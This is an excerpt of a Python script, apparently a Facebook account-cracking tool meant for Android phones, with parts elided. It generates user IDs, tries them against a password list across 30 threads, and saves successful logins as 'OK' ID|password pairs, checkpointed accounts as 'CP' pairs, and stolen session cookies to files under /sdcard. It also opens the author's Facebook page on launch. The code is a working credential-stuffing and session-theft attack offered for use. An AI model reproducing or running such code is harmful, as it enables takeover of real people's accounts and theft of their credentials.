...
╚═╝  ╚═╝╚═╝╚═╝     ╚═╝  ╚═╝   ╚═╝   
""")
os.system('xdg-open https://www.facebook.com/rajif.khan.1441?mibextid=ZbWKwL')
def linex():
        print('\033[1;37m-----------------------------------------')
def clear():
        os.system('clear')
...
def auto_file(cookies,access_token):
        ...
        print('\n \033[1;97m /sdcard/RIFAT.txt \033[0;97m\n')
        #100010138361148
...
def bd():
                ...
                with tred(max_workers=30) as AJX:
                        ...
                        print(f'\033[1;32m Use airplane mode for speed up ')
                        linex()
                        print("\033[1;32m OK IDZ SAVED IN >>>>> /SDCARD/RIFAT-OK.TXT")
                        print("\033[1;32m CP IDZ SAVED IN >>>>> /SDCARD/RIFAT-CP.TXT")
                        print("\033[1;32m COOKIE SAVED IN >>>> /SDCARD/RIFAT-COOKIE.TXT")
                        linex()
                        for psx in user:
                                ids = code+psx
...
def ffb(ids,names,passlist):
    ...
    'user-agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194A',
                        ...
                        if "c_user" in AJX:
                                ...
                                print("Cookie: "+coki)
                                open('/sdcard/RIFAT-COOKIE.txt','a').write(coki+'\n')
                ...
                for pas in passlist:
                        ...
                        if 'session_key' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        print('\r\r\033[1;32m [RIFAT-OK] '+str(uid)+' | '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        print("Cookie: "+coki)
                                        open('/sdcard/RIFAT-COOKIE.txt','a').write(coki+'\n')
                                        open('/sdcard/RIFAT-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                        oks.append(str(uid))
                                        break
                                ...
                                if uid in oks:pass
                                        ...
                                        print('\r\r\x1b[38;5;208m [RIFAT-CP] '+str(uid)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/RIFART-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
                        else:continue
                loop+=1
